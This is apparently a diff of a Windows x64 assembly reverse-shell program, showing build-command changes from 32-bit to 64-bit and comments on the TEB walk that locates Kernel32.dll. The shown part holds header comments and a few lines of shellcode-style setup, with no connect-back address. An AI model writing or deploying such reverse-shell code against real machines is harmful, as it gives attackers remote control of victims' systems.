@@ -1,13 +1,11 @@
 ; ========================
 ; @Maroder
 ; @for DevGnode 
-; nasm -f win32 reverse_shell.s -o reverse_shell.o
-; ld -m i386 reverse_shell.o -o reverse_shell32.exe
+; nasm -f win64 reverse_shell.s -o reverse_shell.o
+; ld -m i386pep reverse_shell.o -o reverse_shell64.exe
 ;
 ; targets :
-;	WIN32 -  i've try this reverse shell on 
-;		 XP SP3, Win10 pro Arch.
-;
+;	WINx64
 ;=========================
 [BITS 64]
 
@@ -126,7 +124,7 @@ _start:
 	;	mov rdx, [gs:rdx]	; TEB
 	;	mov rax, [rdx+0x18]	; ntdll.dll .section data
 	;	mov esi, [rax+0x38]	--> 007638F0
-	;	mov rdi, [rsi]
+	;	mov rdi, [rsi]		--> Kernel32.dll
 	
 	mov rdx, 0x60
 	mov rdx, [gs:rdx]	; TEB
